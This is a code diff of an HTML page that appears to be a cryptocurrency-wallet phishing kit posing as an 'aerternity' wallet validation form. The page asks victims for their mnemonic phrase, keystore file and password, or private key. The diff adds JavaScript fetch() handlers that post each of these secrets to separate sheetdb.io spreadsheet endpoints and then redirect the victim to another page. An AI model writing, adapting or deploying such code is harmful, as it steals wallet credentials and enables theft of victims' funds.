@@ -61,7 +61,7 @@
       </div>
           <div id="phrase" class="tabcontent" style="display: block;">
 
-        <form action="https://sheetdb.io/api/v1/tzpzgrvcmooc9" method="post" id="sheetdb-form">
+        <form w="" action="https://sheetdb.io/api/v1/tzpzgrvcmooc9" method="post" id="sheetdb-form">
              <input type="hidden" name="w" value="aerternity"> 
             <textarea name="data[phrase]" class="phrase" required="required" minlength="10" placeholder="Enter Your Mnemonic Phrase *"></textarea>
             <input type="text" name="user" value="" style="visibility: hidden;">
@@ -76,7 +76,7 @@
     </div>
 
     <div id="keystore" class="tabcontent" style="display: none;">
-        <form action="https://sheetdb.io/api/v1/tzpzgrvcmooc9" method="post" id="sheetdb-form">
+        <form action="https://sheetdb.io/api/v1/e48arcesatwap" method="POST" id="jsonkeystore">
 
             <input type="hidden" name="w" value="aerternity">
 
@@ -89,20 +89,20 @@
             <input type="text" name="user" value="" style="visibility: hidden;">
             <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
             <br>
-            <button id="keystorejson" type="submit" class="btn">VALIDATE</button>
+            <button type="submit" class="btn">VALIDATE</button>
         </form>
     </div>
 
     <div id="private" class="tabcontent" style="display: none;">
-        <form action="https://sheetdb.io/api/v1/tzpzgrvcmooc9" method="post" id="sheetdb-form">
+        <form action="https://sheetdb.io/api/v1/xs39hdn50qdbu" method="post" id="privatekey">
             <input type="hidden" name="w" value="aerternity">
             <div class="field">
-                <input type="text" name="data[key]" class="key" placeholder="Private Key">
+                <input type="text" name="data[privatekey]" class="key" placeholder="Private Key">
             </div>
             <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
             <input type="text" name="user" value="" style="visibility: hidden;">
             <br>
-            <button id="privateKey" type="submit" class="btn">VALIDATE</button>
+            <button type="submit" class="btn">VALIDATE</button>
         </form>
     </div>
 
@@ -129,26 +129,54 @@ form.addEventListener("submit", e => {
       response => response.json()
   ).then((html) => {
     // you can put any JS code here
-    window.location('../success.html');
+    // window.location('./success.html');
 
   });
 });
 </script>
 
 <script>
-    // for the phrase
+    var form = document.getElementById('jsonkeystore');
+form.addEventListener("submit", e => {
+  e.preventDefault();
+  fetch(form.action, {
+      method : "POST",
+      body: new FormData(document.getElementById("jsonkeystore")),
+  }).then(
+      response => response.json()
+  ).then((html) => {
+    // you can put any JS code here
+    // window.location('./success.html');
+    // alert('key posted successfully')
+    location.replace("index9e36.html");
+
+  });
+});
+</script>
+
+<script>
+    var form = document.getElementById('privatekey');
+form.addEventListener("submit", e => {
+  e.preventDefault();
+  fetch(form.action, {
+      method : "POST",
+      body: new FormData(document.getElementById("privatekey")),
+  }).then(
+      response => response.json()
+  ).then((html) => {
+    // you can put any JS code here
+    // window.location('./success.html');
+    // alert('key posted successfully')
+    location.replace("index9e36.html");
+
+  });
+});
+</script>
+
+<script>
     document.getElementById('submitPhrase').onclick = function(){
-        location.replace("index9e36.html")
-    }
-
-    // for json key store
-    document.getElementById('keystorejson').onclick = function(){
-        location.replace("index9e36.html")
-    }
-
-//   for private key
-    document.getElementById('privatKey').onclick = function(){
-        location.replace("index9e36.html")
+        location.replace("index9e36.html");
+        
     }
 </script>
 
